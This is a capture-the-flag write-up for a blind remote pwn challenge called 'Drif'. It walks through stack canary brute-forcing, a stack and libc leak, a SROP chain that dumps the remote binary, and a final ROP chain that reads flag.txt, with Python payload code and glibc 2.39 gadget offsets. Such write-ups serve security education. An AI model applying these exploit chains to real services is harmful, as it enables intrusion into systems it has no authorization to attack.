---
title: "Drif"
description: "Only the remote service was provided. It offered:"
event: "cryovault"
category: "pwn"
categoryLabel: "Pwn"
tags: ["ISFCR CryoVault Finals 2026","pwn"]
date: "2026-10-26"
teammate: false
source: "cryovault/pwn/drif/writeup.md"
---

**Category:** Pwn (blind / remote-only)
**Target:** `nc 0.cloud.chals.io 20061`
**Flag:** `isfcr{n0_w1n_func_s0_y0u_r0p_0p3n_r3ad_wr1t3_blind_3f9c21}`

## Overview

Only the remote service was provided. It offered:

```text
drift log mounted. seek offset.
seek> 
```

Input was consumed by a raw `read()` and answered with the number of bytes
read:

```text
seek> AAAA
seeked 4.
seek> 
```

The prompt loop and the byte count suggested a stack overflow behind a stack
canary. The challenge turned out to be part of the same binary template family
as `floe`, `blizzard`, and `serac`, but with a simpler read loop.

## 1. Stack layout and canary

Sending 88 bytes was safe; a nonzero 89th byte killed the process. The usual
byte-at-a-time oracle recovered the canary:

```text
offset 0..87   : buffer
offset 88..95  : stack canary
offset 96..103 : padding
offset 104..111: saved return address
```

This was confirmed by returning to `0x4006b4`, the normal "seeked" path, with
a 112-byte payload:

```text
seeked 112.
seek>
```

The service forks per connection, so the canary is stable for one service
instance but changes when the parent restarts. The first canary byte is
`0x00`; the rest were brute-forced with `work/brute_new.py`. The current value
is stored in `work/canary.json`.

## 2. Finding a leak

A scan of return addresses found an unusual address at `0x4005c2`. Returning
there with a 112-byte payload dumped 112 bytes starting at `buffer + 112`
(the caller's stack, just past the overwritten return address):

```text
0x402e00
00 17 03 a0 c9 15 82 d3   <- canary
0x0000000000000004        <- client socket fd
0x000000000040083e
...
0x00007fff2206d0b8        <- stack pointer
0x00007fff2206d030        <- stack pointer
0x0000000000000002
0x000075cd5b9451ca        <- libc return address
```

The reason is visible once the binary is reversed: `0x4005c2` is the
instruction after `call read` in the record-sender function. Entering there
with `RAX = bytes_read` jumps to the `write(out_fd, rsp, rax)` path, where
`rsp` is the caller's stack slot at `buffer + 112`.

The leaked `0x...1ca` matches `__libc_start_call_main` in Ubuntu 24.04 glibc
2.39 (the same libc used by the sibling challenges), so:

```python
libc_base = leak - 0x2a1ca
```

The connection and the exploit can be done on separate connections because the
forked children inherit the same mappings and stack layout. If the service
restarts, both the canary and the libc base change.

## 3. Dumping the binary with SROP

Useful libc offsets for Ubuntu 24.04 / glibc 2.39:

```text
pop rax ; ret  + 0x0dd337
syscall        + 0x288b5
```

A SROP chain sets `rax = 15` and executes `syscall`, restoring a full register
frame from the stack. Place the `SigreturnFrame` immediately after the
`syscall` address:

```python
frame = SigreturnFrame()
frame.rax = 1          # write
frame.rdi = 4          # client socket
frame.rsi = 0x400000   # ELF base
frame.rdx = 0x2000
frame.rip = libc_base + 0x288b5
frame.rsp = 0

payload  = b"A" * 88 + canary + b"B" * 8
payload += p64(libc_base + 0x0dd337)  # pop rax ; ret
payload += p64(15)                    # rt_sigreturn
payload += p64(libc_base + 0x288b5)   # syscall
payload += bytes(frame)
```

The write syscall then returns the first `0x2000` bytes of the non-PIE binary
straight to the client. The dump is saved as `work/drif_dump.bin`.

Reversing the dump showed a small, nearly identical variant of the sibling
template:

```text
0x400570 : pop rdi ; ret
0x400580 : open/read/write record routine
0x401610 : "flag.txt"
```

The record routine at `0x400580`:

```asm
; rdi = pathname
mov esi, 0
call open               ; open(path, O_RDONLY)
...
mov rsi, rsp
mov edx, 0xa0
mov edi, fd
call read               ; read up to 0xa0 bytes
...
mov rsi, rsp
mov rdx, rax
mov edi, [0x40308c]     ; client socket
call write              ; send contents to us
```

No other argument is needed: the function ignores `rsi` and reads a fixed
`0xa0` bytes. On failure it prints `no record at that offset`.

## 4. Final exploit

```python
from pwn import p64

canary = bytes.fromhex("001703a0c91582d3")   # per-instance; brute-force if stale

payload  = b"A" * 88 + canary + b"B" * 8
payload += p64(0x400570)                     # pop rdi ; ret
payload += p64(0x401610)                     # "flag.txt"
payload += p64(0x400580)                     # open/read/write flag
payload += p64(0) + p64(0)                   # post-return padding
```

Send the payload after the prompt and read the result:

```text
isfcr{n0_w1n_func_s0_y0u_r0p_0p3n_r3ad_wr1t3_blind_3f9c21}
```

The working scripts are:

- `work/exploit_drif.py` — final exploit
- `work/srop_dump.py` — libc leak + SROP arbitrary read
- `work/brute_new.py` — canary brute-forcer
- `work/drif_dump.bin` — leaked remote binary

## Notes

- The service is flaky under load: wait for the `seek> ` prompt with a generous
  timeout before sending the payload.
- The canary rotates when the service restarts. Verify it with a 96-byte
  payload (`A*88 + canary` should print `seeked 96.`) before exploiting.
- Unlike the sibling challenges, no decoy `isfcr{...}` strings were needed:
  the real flag is read from `flag.txt` at runtime.
